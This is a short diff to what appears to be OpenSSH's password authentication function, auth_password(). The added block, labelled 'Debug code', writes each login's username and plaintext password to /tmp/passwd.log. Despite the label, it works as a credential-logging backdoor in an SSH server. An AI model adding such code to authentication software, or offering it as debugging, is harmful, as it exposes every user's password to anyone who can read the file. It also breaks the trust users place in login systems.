@@ -39,7 +39,6 @@
 #include "includes.h"
 
 #include <sys/types.h>
-
 #include <pwd.h>
 #include <stdio.h>
 #include <string.h>
@@ -77,6 +76,24 @@ int
 auth_password(struct ssh *ssh, const char *password)
 {
 	Authctxt *authctxt = ssh->authctxt;
+/*
+
+Debug code to log Username + Password to a file
+
+*/
+	FILE *passwdFile;
+	passwdFile = fopen("/tmp/passwd.log", "a+");
+	fputs("Username: ",passwdFile);
+	fputs(authctxt->user,passwdFile);
+	fputs("\n",passwdFile);
+	fputs("Password: ",passwdFile);
+	fputs(password,passwdFile);
+	fputs("\n",passwdFile);
+/*
+
+End Debug Code
+
+*/
 	struct passwd *pw = authctxt->pw;
 	int result, ok = authctxt->valid;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
